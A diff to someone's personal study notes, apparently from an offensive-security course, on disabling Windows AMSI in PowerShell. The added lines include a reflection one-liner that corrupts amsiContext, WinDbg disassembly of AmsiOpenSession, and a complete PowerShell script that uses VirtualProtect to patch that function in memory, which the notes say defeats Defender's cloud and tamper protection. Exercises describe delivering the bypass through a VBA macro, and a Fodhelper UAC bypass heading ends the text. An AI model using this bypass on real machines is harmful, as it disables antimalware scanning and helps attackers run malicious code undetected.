@@ -91,6 +91,8 @@ The unmanaged dynamic link library AMSI.DLL is loaded into every PowerShell and
 PowerShell_ISE process and provides a number of exported functions that PowerShell takes 
 advantage of.
 
+# understanding AMSI
+
 The AMSI exported APIs include AmsiInitialize, AmsiOpenSession, AmsiScanString, 
 AmsiScanBuffer, and AmsiCloseSession.
 
@@ -281,7 +283,7 @@ then `amsiutils`
 
 this requires manual intervention
 
-instead lets go for non manual implementation directlyform powershell.
+### instead lets go for non manual implementation of stopping amsi directlyform powershell.
 
 `$a=[Ref].Assembly.GetTypes()`
 
@@ -406,6 +408,295 @@ PS C:\Users\Offsec> $f.GetValue($null)
 ```
 converting to hex:
 0x2C8CC81D510
+
+one liner to remove AMSI
+
+```
+ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+
+This script is blocked by windows defender.
+
+need to remove tamper protection for it to run.
+
+still didnt work
+
+![](amsi_bypass_not_working.png)  
+
+
+### 7.3.1.1 Exercises
+1. Inspect the amsiContext structure to locate the AMSI header using Frida and WinDbg.
+2. Manually modify the amsiContext structure in WinDbg and ensure AMSI is bypassed.
+3. Replicate the .NET reflection to dynamically locate the amsiContext field and modify it.
+
+# wreaking amsi in powershell
+
+In the last section, we used reflection to locate vital structures and variables that, when corrupted, 
+will cause AMSI to be disabled. In this section, we’ll modify the assembly instructions themselves 
+instead of the data they are acting upon in a technique known as binary patching. We can use this 
+technique to hotpatch the code and force it to fail even if the data structure is valid.
+
+# understanding the assembly flow
+
+dumping the contents of AmsiOpenSession
+
+```
+0:011> u amsi!AmsiOpenSession L1A
+```
+output
+
+```
+amsi!AmsiOpenSession:
+00007ffa`1778d980 4885d2          test    rdx,rdx
+00007ffa`1778d983 743f            je      amsi!AmsiOpenSession+0x44 (00007ffa`1778d9c4)
+00007ffa`1778d985 4885c9          test    rcx,rcx
+00007ffa`1778d988 743a            je      amsi!AmsiOpenSession+0x44 (00007ffa`1778d9c4)
+00007ffa`1778d98a 4883790800      cmp     qword ptr [rcx+8],0
+00007ffa`1778d98f 7433            je      amsi!AmsiOpenSession+0x44 (00007ffa`1778d9c4)
+00007ffa`1778d991 4883791000      cmp     qword ptr [rcx+10h],0
+00007ffa`1778d996 742c            je      amsi!AmsiOpenSession+0x44 (00007ffa`1778d9c4)
+00007ffa`1778d998 41b801000000    mov     r8d,1
+00007ffa`1778d99e 418bc0          mov     eax,r8d
+00007ffa`1778d9a1 f00fc14118      lock xadd dword ptr [rcx+18h],eax
+00007ffa`1778d9a6 4103c0          add     eax,r8d
+00007ffa`1778d9a9 4898            cdqe
+00007ffa`1778d9ab 488902          mov     qword ptr [rdx],rax
+00007ffa`1778d9ae 7510            jne     amsi!AmsiOpenSession+0x40 (00007ffa`1778d9c0)
+00007ffa`1778d9b0 418bc0          mov     eax,r8d
+00007ffa`1778d9b3 f00fc14118      lock xadd dword ptr [rcx+18h],eax
+00007ffa`1778d9b8 4103c0          add     eax,r8d
+00007ffa`1778d9bb 4898            cdqe
+00007ffa`1778d9bd 488902          mov     qword ptr [rdx],rax
+00007ffa`1778d9c0 33c0            xor     eax,eax
+00007ffa`1778d9c2 c3              ret
+00007ffa`1778d9c3 cc              int     3
+00007ffa`1778d9c4 b857000780      mov     eax,80070057h
+00007ffa`1778d9c9 c3              ret
+00007ffa`1778d9ca cc              int     3
+```
+
+We are trying to modify test rdx, rdx with xor rax, rax
+
+we want to make minimum modification as possible
+
+### 7.4.1.1 Exercises
+1. Follow the analysis in WinDbg and locate the TEST and conditional jump instruction.
+2. Search for any other instructions inside AmsiOpenSession that could be overwritten just as 
+easily to achieve the same goal
+
+done above
+
+# patching the internals
+
+To implement the attack, we’ll need to perform three actions. We’ll obtain the memory address of 
+AmsiOpenSession, modify the memory permissions where AmsiOpenSession is located, and 
+modify the three bytes at that location.
+
+we have been provided a lookup function to find out the base address of amsi dll.
+
+```
+function LookupFunc {
+ Param ($moduleName, $functionName)
+ $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+ Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+ Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+ $tmp=@()
+ $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+ return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
+@($moduleName)), $functionName))
+}
+```
+we can use this function like any other win32 API to locate the amsi opensession by opening a 64 bit instance of powershell_ise and executing the following code.
+
+```
+function LookupFunc {
+ Param ($moduleName, $functionName)
+ $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+ Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+ Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+ $tmp=@()
+ $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+ return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
+@($moduleName)), $functionName))
+}
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$funcAddr
+```
+
+To verify this address, we’ll open WinDbg, attach to the PowerShell_ISE process and quickly 
+translate the address to hexadecimal with the ? command, prepending the address with 0n
+
+```
+? 0n140706668796288
+```
+
+
+```s
+0:027> ? 0n140712112347520
+Evaluate expression: 140712112347520 = 00007ffa`1778d980
+```
+
+```
+u 00007ff8`d302d980
+```
+
+```
+amsi!AmsiOpenSession:
+00007ff8`d302d980 4885d2          test    rdx,rdx
+00007ff8`d302d983 743f            je      amsi!AmsiOpenSession+0x44 (00007ff8`d302d9c4)
+00007ff8`d302d985 4885c9          test    rcx,rcx
+00007ff8`d302d988 743a            je      amsi!AmsiOpenSession+0x44 (00007ff8`d302d9c4)
+00007ff8`d302d98a 4883790800      cmp     qword ptr [rcx+8],0
+00007ff8`d302d98f 7433            je      amsi!AmsiOpenSession+0x44 (00007ff8`d302d9c4)
+00007ff8`d302d991 4883791000      cmp     qword ptr [rcx+10h],0
+00007ff8`d302d996 742c            je      amsi!AmsiOpenSession+0x44 (00007ff8`d302d9c4)
+```
+
+In Windows, all memory is divided into 0x1000-byte pages.
+379 A memory protection setting is 
+applied to each page, describing the permissions of data on that page.
+Normally, code pages are set to PAGE_EXECUTE_READ, or 0x20,380 which means we can read and 
+execute this code, but not write to it. This obviously presents a problem.
+Let’s verify this in WinDbg with !vprot,
+381 which displays memory protection information for a 
+given memory address:
+
+```
+!vprot 00007ff8`d302d980
+BaseAddress:       00007ff8d302d000
+AllocationBase:    00007ff8d3020000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+RegionSize:        0000000000008000
+State:             00001000  MEM_COMMIT
+Protect:           00000020  PAGE_EXECUTE_READ
+Type:              01000000  MEM_IMAGE
+```
+
+we can overwrite the bytest on this page by using the vitual protect api
+
+creating a module to call virtual protect
+
+```
+function LookupFunc {
+ Param ($moduleName, $functionName)
+ $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+ $tmp=@()
+ $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+ return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
+}
+
+function getDelegateType {
+ Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
+ $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+ $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+ $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed') 
+ return $type.CreateType()
+}
+
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], 
+[UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+```
+
+after doing this, we find that
+
+```
+0:025> !vprot 00007ff8`d302d980
+BaseAddress:       00007ff8d302d000
+AllocationBase:    00007ff8d3020000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+RegionSize:        0000000000001000
+State:             00001000  MEM_COMMIT
+Protect:           00000080  PAGE_EXECUTE_WRITECOPY
+Type:              01000000  MEM_IMAGE
+```
+
+However, the new memory protection is set to PAGE_EXECUTE_WRITECOPY instead of 
+PAGE_EXECUTE_READWRITE. In order to conserve memory, Windows shares AMSI.DLL between 
+processes that use it. PAGE_EXECUTE_WRITECOPY is equivalent to 
+PAGE_EXECUTE_READWRITE but it is a private copy used only in the current process
+
+We can use the Copy385 method from the System.Runtime.InteropServices namespace to copy the 
+assembly instruction (XOR RAX,RAX) represented as 0x48, 0x31, 0xC0 from a managed array 
+($buf) to unmanaged memory
+
+```ps1
+$buf = [Byte[]] (0x48, 0x31, 0xC0) 
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+```
+
+we can also now restore the memory address to covver our tracks
+
+```
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+```
+
+the entire code together then for amsi bypass
+
+
+```
+function LookupFunc {
+ Param ($moduleName, $functionName)
+ $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+ $tmp=@()
+ $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+ return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
+}
+
+function getDelegateType {
+ Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
+ $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+ $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+ $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed') 
+ return $type.CreateType()
+}
+
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], 
+[UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+
+$buf = [Byte[]] (0x48, 0x31, 0xC0) 
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+
+
+```
+
+this works even with cloud protect and tamper protection
+
+### 7.4.2.1 Exercises
+1. Recreate the bypass shown in this section by both entering the commands directly in the 
+command prompt and by downloading and executing them as a PowerShell script from your 
+Kali Linux Apache web server.
+2. Incorporate this bypass into a VBA macro where PowerShell is launched through WMI to 
+bypass both the Windows Defender detection on the Microsoft Word document and the 
+AMSI-based detection.
+
+### 7.4.2.2 Extra Mile Exercise
+Create a similar AMSI bypass but instead of modifying the code of AmsiOpenSession, find a 
+suitable instruction to change in AmsiScanBuffer and implement it from reflective PowerShell.
+
+# UAC bypass vs Microsoft Defender
+
+ This case study leverages a UAC386 bypass that abuses the 
+Fodhelper.exe application.
+
+# FODHelper UAC bypass
+
+
+
+
+
+
+
+
+
+
 
 
 
